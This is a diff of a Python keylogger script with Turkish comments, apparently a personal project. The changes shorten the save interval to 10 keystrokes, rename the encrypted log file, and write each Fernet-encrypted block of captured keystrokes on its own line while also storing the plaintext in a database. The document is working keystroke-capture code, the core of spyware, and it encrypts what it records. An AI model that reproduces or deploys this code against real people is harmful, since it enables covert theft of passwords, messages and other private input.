@@ -15,7 +15,7 @@ f = Fernet(key)  # Anahtar üzerinde işlem yapacak Fernet nesnesini oluşturuyo
 # Log dosyasının yolu
 log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
 log_file = log_dir + "log.txt"
-encrypted_log_file = "log.txt"
+encrypted_log_file = "e_log.txt"
 keys = []
 
 
@@ -27,7 +27,7 @@ def encrypt_content(content):
 # Klavye tuşlarını kaydetme
 def on_press(key):
     keys.append(key)
-    if len(keys) >= 15:  # 15 tuş basımından sonra kaydet
+    if len(keys) >= 10:  # 10 tuş basımından sonra kaydet
         write_file(keys)
         keys.clear()
 
@@ -45,10 +45,10 @@ def write_file(keys):
             log_content += k
     log_content += f' [{datetime.now()}]\n'
 
-    # Dosyayı şifreleme ve yazma
+    # Yeni log içeriğini şifreleme ve dosyaya ekleme
     encrypted_content = encrypt_content(log_content)
     with open(encrypted_log_file, "ab") as file:
-        file.write(encrypted_content)
+        file.write(encrypted_content + b'\n')  # Satır sonu ekleyerek her bir bloğu ayırıyoruz
     # Veritabanına ekleme
     insert_log(log_content)
 
